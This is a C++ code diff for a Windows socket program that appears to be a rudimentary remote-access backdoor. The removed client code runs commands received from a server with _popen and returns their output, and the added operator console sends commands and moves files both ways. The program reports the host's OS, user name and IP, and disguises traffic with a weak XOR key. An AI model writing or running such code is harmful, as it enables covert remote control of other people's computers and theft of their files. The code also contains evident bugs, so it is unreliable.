@@ -11,6 +11,7 @@
 #include <string>
 #include <iostream>
 #include <VersionHelpers.h>
+#include <sstream>
 #include <fstream>
 
 #pragma comment(lib, "iphlpapi.lib")
@@ -32,9 +33,11 @@ public:
 	int createclientsocket(addrinfo *info);
 	int sendData(std::string msg);
 	int recvData();
+	int operations(std::string msg);
 	void endclient();
-	int sendFile();
-	int recvFile();
+	std::string encryption(std::string msg);
+	int sendfile(std::string directory);
+	std::string recvfile();
 };
 
 //Constructor
@@ -60,7 +63,7 @@ Socks::Socks() {
 	WSACleanup();
 	exit(11);
 	}
-	 //
+
 	myBackup = mySocket;*/
 }
 
@@ -124,10 +127,9 @@ int Socks::createclientsocket(addrinfo *info) {
 //send data
 int Socks::sendData(std::string msg) {
 	int result = 0;
-	std::string peaky = "enCRAPtion";
-	int peaky_len = peaky.length();
+	
 	//send client information
-	if (msg == "") {
+	if (msg == "information") {
 		//gets operating system version
 		if (!IsWindows8OrGreater()) {
 			msg = "Less than Windows 8";
@@ -142,18 +144,22 @@ int Socks::sendData(std::string msg) {
 
 		msg = "CLIENT_INFO\nOS: " +  msg + "\nUser Name: " + username + "\nIP Address: " + ipaddr + "\nPort: " + port;
 	}
-	//printf("Plaintext String before encryption %s", msg.c_str());
-	//sends server information about client
-	//encryption
-	/*
+
+	//send message length
 	int msg_len = msg.length();
-	for (int i = 0, x = 0; i < msg_len; i++, x++) {
-		if (x >= peaky_len) {
-			x = 0;
-		}
-		msg[i] = msg[i] ^ peaky[x];
-	} */
-	//printf("Encrypted String sent to server: %s", msg.c_str());
+	std::stringstream out;
+	out << msg_len;
+	std::string msg_as_len = out.str();
+	result = send(ConnectSocket, msg_as_len.c_str(), msg_as_len.length(), 0);
+	if (result == SOCKET_ERROR) {
+		printf("send failed: %d\n", WSAGetLastError());
+		closesocket(ConnectSocket);
+		WSACleanup();
+		return 7;
+	}
+
+	//send message
+	msg = encryption(msg);
 	result = send(ConnectSocket, msg.c_str(), msg.length(), 0);
 	if (result == SOCKET_ERROR) {
 		printf("send failed: %d\n", WSAGetLastError());
@@ -161,221 +167,141 @@ int Socks::sendData(std::string msg) {
 		WSACleanup();
 		return 7;
 	}
-	
 	return 0;
 }
 
 //recieve data
 int Socks::recvData() {
 	int result = 0;
-	char recvbuf[512];
-	std::string msg = "";
-	std::string peaky = "enCRAPtion";
-	int peaky_len = peaky.length();
-
-	result = recv(ConnectSocket, recvbuf, 512, 0);
+	char recvbuf[20];
+	result = recv(ConnectSocket, recvbuf, 20, 0);
 
 	if (result > 0) {
+		std::string msg = recvbuf;
+
 		//parse actual data from message
-		for (int i = 0; i < 512; i++) {
+		for (int i = 0; i < 20; i++) {
 			if (recvbuf[i] > 0)
 				msg = msg + recvbuf[i];
 		}
-		/*
-		int msg_len = msg.length();
-		//unencrypt
-		for (int i = 0, x = 0; i < msg_len; i++, x++) {
-			if (x >= peaky_len) {
-				x = 0;
-			}
-			msg[i] = msg[i] ^ peaky[x];
-		}*/
-		printf("Unencrypted message: %s\n", msg.c_str());
-		//////////////////////Parse msg for the word "upload"/////////////////////
-		if (msg == "upload") {
-			printf("Upload command recieved\n");
-			recvFile();
+		int msg_len = atoi(msg.c_str());
 
-		}
-		else {
-			//////////////////////////////////////////////////////////////////////////
-			//need to pipe output into char array
-			//take address from captured response
-			char buffer[4000];
-			std::string data = "";
-			//runs a command 
-			FILE* _pipe = _popen(msg.c_str(), "r");
-			//redirects stdout to pipe and adds elements of buffer to result string
-			if (!_pipe) {
-				std::cout << "ERROR" << std::endl;
+		int number_of_bytes = 0;
+		msg = "";
+		while (number_of_bytes < msg_len) {
+			result = recv(ConnectSocket, recvbuf, 20, 0);
+			if (result > 0) {
+				for (int i = 0; i < 20; i++) {
+					msg = msg + recvbuf[i];
+				}
+				number_of_bytes += 20;
 			}
-
-			while (!feof(_pipe)) {
-				//place characters in buffer into string
-				if (fgets(buffer, 4000, _pipe) != NULL)
-					data += buffer;
-			}
-			_pclose(_pipe);
-			sendData(data);
-		}
-	}
-			else if (result == 0)
-				printf("Connection closed\n");
 			else
-				printf("recv failed: %d\n", WSAGetLastError());
-		
-	return 0;
-}
-
-//sends file
-int Socks::sendFile() {
-	int result = 0;
-	std::string msg;
-	std::string peaky = "enCRAPtion";
-	int peaky_len = peaky.length();
-	//read file
-
-	int msg_len = msg.length();
-
-	for (int i = 0, x = 0; i < msg_len; i++, x++) {
-		if (x >= peaky_len) {
-			x = 0;
+				break;
 		}
-		msg[i] = msg[i] ^ peaky[x];
-	}
-	result = send(ConnectSocket, msg.c_str(), msg.length(), 0);
-	if (result == SOCKET_ERROR) {
-		printf("send failed: %d\n", WSAGetLastError());
-		closesocket(ConnectSocket);
-		WSACleanup();
-		return 7;
-	}
-	return 0;
-}
-
-
-int Socks::recvFile() {
-	const int RECVCHUNK = 8096;
-	char recvbuf[1500];
-	std::fstream recvFile;					//create a new filestream for recv'd data
-	std::string fileName;					//for the directory sent from server
-	int result = 0;
-	std::string peaky = "enCRAPtion";
-	int peaky_len = peaky.length();
-
-	////////////////////////////////
-	// Send "okay" to acknowledge the upload command sent
-	////////////////////////////////
-	sendData("okay");			//Acknowledge the upload command sent
-	//printf("We just sent \"okay\" to the server\n");
-
-	/////////////////////////////////
-	//recv the fileName (directory)
-	/////////////////////////////////
-	result = recv(ConnectSocket, recvbuf, RECVCHUNK, 0);	
-	if (result > 0) {
-		//parse actual data from message
-		for (int i = 0; i < 512; i++) {
-			if (recvbuf[i] > 0)
-				fileName = fileName + recvbuf[i];
-		}
-		memset(recvbuf, 0, sizeof(recvbuf));			// clear the receive buffer
-		//printf("Message sent from server (FILENAME):   %s\n", fileName.c_str());
-		int msg_len = fileName.length();
-		//unencrypt
-		/* for (int i = 0, x = 0; i < msg_len; i++, x++) {		//TURN ON ENCRYPTION ON SERVER TO TEST DECRYPTION
-			if (x >= peaky_len) {
-				x = 0;
+		if (result > 0) {
+			std::string encrypted_str = "";
+			for (int i = 0; i < msg_len; i++) {
+				encrypted_str += msg[i];
 			}
-			fileName[i] = fileName[i] ^ peaky[x];
+			encrypted_str = encryption(encrypted_str);
+			printf("%s", encrypted_str.c_str());
 		}
-		//printf("Decrypted message: %s\n", fileName.c_str());
-		*/
 	}
 	else if (result == 0)
 		printf("Connection closed\n");
 	else
 		printf("recv failed: %d\n", WSAGetLastError());
-
-	////////////////////////////////
-	// Send "okay" to acknowledge the upload command sent
-	////////////////////////////////
-	sendData("okay");			//Acknowledge the upload command sent
-								//Next message sent should be the files data
-	//printf("We just sent \"okay\" to the server\n");
-
-
-	////////////////////////////////
-	// RECV THE FILE DATA (CAN ONLY HANDLE TEXT FILES AT THE MOMENT
-	////////////////////////////////
-	std::ofstream writeData;		//Output stream to store incoming file data
-	
-	//if (!writeData.is_open()) {
-		//printf("unable to open up file");
-		//return 0;
-	//}
-	int found = 0;						// Points to the first char found
-	found = fileName.find_last_of("/"); // /Parse the directory to get the filename 
-	std::string newFile = fileName.substr(found + 1, fileName.length()).c_str(); // store the filename not the full path
-	writeData.open(newFile, std::ofstream::out | std::ofstream::trunc); //open up a local file to write to
-	char eof[] = "EOF";					// EOF marker
-	char *output;						// compare the input from server to find the EOF
-	while(result > 0)
-	{
-		std::string fileData;		    //Store the data somewhere 
-		result = recv(ConnectSocket, recvbuf, sizeof(recvbuf), 0);	//start receiving file data
-		for (int i = 0; i < sizeof(recvbuf); i++) {
-			if (recvbuf[i] > 0)
-				fileData = fileData + recvbuf[i];
-		}
 		
-		output = strstr(recvbuf, eof);				//See if we reached the end of file marker, if not, keep receiving data
-		if (output)
-		{
-			//printf("recvbuf contains when exiting....  %s\n", recvbuf);
-			printf("Recv EOF marker\n\n");
-			writeData.close();
-			break;
-		}
-		//writeData << fileData;					// WRITE THE DATA TO OUR OUTPUT STREAM !!
-		writeData.write(fileData.c_str(), fileData.length());
-		memset(recvbuf, 0, sizeof(recvbuf));	// clear the receive buffer
-		//printf("CONTENTS: %s\n\n", fileData.c_str());
-
-	}
-	//printf("OUTSIDE THE RECV CALL\n\n");
-
-	/* if (result > 0) {
-		//parse actual data from message
-		for (int i = 0; i < 512; i++) {
-			if (recvbuf[i] > 0)
-				fileData = fileData + recvbuf[i];
-		}
-
-
-
-		printf("Message sent from server (file data):   %s\n", fileData.c_str());
-		int fileData_len = fileData.length();
-		//unencrypt
-		 for (int i = 0, x = 0; i < msg_len; i++, x++) {		//TURN ON ENCRYPTION ON SERVER TO TEST DECRYPTION
-		if (x >= peaky_len) {
-		x = 0;
-		}
-		fileName[i] = fileName[i] ^ peaky[x];
-		}
-		//printf("Decrypted message: %s\n", fileName.c_str());
-	}
-	else if (result == 0)
-		printf("Connection closed\n");
-	else
-		printf("recv failed: %d\n", WSAGetLastError());
-	 */
-
-	//printf("END OF RECV FILE JUSTIN\n\n");
-
 	return 0;
 }
 
+//receive file from client
+std::string Socks::recvfile() {
+	int result = 0;
+	char recvbuf[20];
+	result = recv(ConnectSocket, recvbuf, 20, 0);
+
+	if (result > 0) {
+		std::string msg = recvbuf;
+
+		//parse actual data from message
+		for (int i = 0; i < 20; i++) {
+			if (recvbuf[i] > 0)
+				msg = msg + recvbuf[i];
+		}
+		int msg_len = atoi(msg.c_str());
+
+		int number_of_bytes = 0;
+		msg = "";
+		while (number_of_bytes < msg_len) {
+			result = recv(ConnectSocket, recvbuf, 20, 0);
+			if (result > 0) {
+				for (int i = 0; i < 20; i++) {
+					msg = msg + recvbuf[i];
+				}
+				number_of_bytes += 20;
+			}
+			else
+				break;
+		}
+		if (result > 0) {
+			std::string encrypted_str = "";
+			for (int i = 0; i < msg_len; i++) {
+				encrypted_str += msg[i];
+			}
+			//decrypt
+			encrypted_str = encryption(encrypted_str);
+			return encrypted_str;
+		}
+	}
+
+	return "0";
+}
+
+//manages networking operations
+int Socks::operations(std::string msg) {
+	recvData();
+	while (msg != "exit") {
+		//get message for server
+		std::cout << "Enter command: ";
+		std::cin >> msg;
+		if (msg == "upload") {
+			sendfile(msg);
+		}
+		else if (msg == "download") {
+			sendData("download");
+			recvData();
+			std::string fname = "";
+			std::cout << "Enter File Path: ";
+			std::cin >> fname;
+			sendData(fname);
+			//receive file
+			msg = recvfile();
+			if (msg != "0") {
+				//open file
+				std::ofstream writeData;//Output stream to store incoming file data
+				int found = 0;			//Points to the first char found
+				found = fname.find_last_of("\\");//Parse the directory to get the filename 
+				std::string newFile = fname.substr(found + 1, fname.length()).c_str(); // store the filename not the full path
+				writeData.open(newFile);//open up a local file to write to
+				//write file
+				if (writeData.is_open()) {
+					printf("%s", msg.c_str());
+					writeData << msg;
+					writeData.close();
+					sendData("Ok\n");
+				}
+			}
+			else
+				sendData("error\n");
+		}
+		else
+			sendData(msg);
+		recvData();
+	}
+	return 0;
+}
 
 //close socket
 void Socks::endclient() {
@@ -383,6 +309,55 @@ void Socks::endclient() {
 	WSACleanup();
 }
 
+//encrypts data
+std::string Socks::encryption(std::string msg) {
+	std::string peaky = "enCRAPtion";
+	int peaky_len = peaky.length();
+	int msg_len = msg.length();
+	//encryption
+	for (int i = 0, x = 0; i < msg_len; i++, x++) {
+		if (x > peaky_len) {
+			x = 0;
+		}
+		msg[i] = msg[i] ^ peaky[x];
+	}
+
+	return msg;
+}
+
+//sends file
+int Socks::sendfile(std::string directory) {
+	////////////////////////////////////
+	// Send "upload" to start file transfer
+	///////////////////////////////////
+	sendData("upload");
+
+	////////////////////////////////////
+	// RECIEVE RESPONSE "OKAY" FROM CLIENT
+	////////////////////////////////////
+	recvData();
+
+	////////////////////////////////////
+	// Start sending file data to client
+	////////////////////////////////////
+	std::cout << "Enter File Path: ";
+	std::cin >> directory;
+
+	std::fstream myfile(directory.c_str(), std::fstream::in);
+	myfile.seekg(0, myfile.end);
+	unsigned int filesize = myfile.tellg();
+	char *fileBuf = new char[filesize];
+	myfile.seekg(0, std::fstream::beg);
+	myfile.read(fileBuf, filesize);
+	myfile.close();
+
+
+	sendData(directory);
+	recvData();
+	sendData(fileBuf);
+	
+	return 0;
+}
 
 int main()
 {
@@ -397,11 +372,9 @@ int main()
 		return 1;
 	}
 	freeaddrinfo(info);
-	socket.sendData("");
-	socket.recvData();
-	std::string nullstr;
-	//socket.sendData(nullstr);
-
+	socket.sendData("information");
+	//socket.recvData();
+	socket.operations("");
 	int temp = 0;
 	std::cin >> temp;
 	/*for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
